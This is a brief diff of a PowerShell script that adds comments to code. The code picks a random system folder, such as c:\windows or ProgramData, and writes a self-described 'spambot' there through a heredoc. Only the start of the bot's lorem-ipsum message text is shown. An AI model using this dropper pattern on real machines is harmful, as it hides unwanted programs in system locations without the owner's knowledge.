@@ -12,6 +12,7 @@ $sbDir = @('c:\programdata\','c:\windows\','c:\Users\Default\AppData\', 'NODIR')
 # this does it automatically.
 $sbRand = Get-Random ($sbDir.Count + 1)
 
+# If no directory is selected, exit the program
 if ($sbDir[$sbRand] -eq 'NODIR') {
 
     exit
@@ -34,6 +35,7 @@ foreach ($d in $sbDir) {
 
 }
 
+# Use a heredoc to write the spambot to the random location
 $writeBot = @'
 # Mesaage from this website: http://generator.lorem-ipsum.info/_latin
 # Put the text into a variable.
